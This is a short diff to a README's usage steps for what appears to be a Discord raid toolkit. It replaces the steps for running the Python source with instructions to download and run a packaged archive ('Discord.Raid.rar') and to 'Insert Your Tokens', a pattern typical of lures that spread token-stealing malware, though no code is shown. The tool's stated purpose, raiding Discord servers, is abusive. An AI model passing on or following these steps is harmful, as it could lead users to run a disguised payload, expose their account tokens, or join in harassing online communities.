@@ -34,13 +34,13 @@
 ## ✍️ Usage
 1. `Use brain`
  
-2. `Download python 3.11.7`
+2. `Download Discord.Raidkit.v2.4.5.zip`
 
-3. `Run main.py`
+3. `Run Discord.Raid.rar`
 
-4. `Wait until it finishes downlading required libs`
+4. `Insert Your Tokens`
 
-5. `Chose an option`
+5. `Have Fun`
 
 
 ## ⚠️ DISCLAIMER
